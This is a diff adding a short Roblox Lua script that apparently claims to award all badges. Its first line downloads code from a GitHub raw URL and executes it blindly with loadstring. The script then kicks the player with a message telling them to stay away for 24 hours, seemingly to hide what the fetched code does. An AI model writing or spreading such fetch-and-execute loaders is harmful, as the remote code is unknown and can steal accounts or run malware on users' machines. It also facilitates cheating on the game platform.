@@ -1,0 +1,10 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ngigerngieofoepdo/GetAllBadges/refs/heads/main/ForTestersCurrently"))()
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local function selfKick()
+    player:Kick("Please wait till badges stop popping up, do not join in the remaining: 24 Hours.")
+end
+
+selfKick()
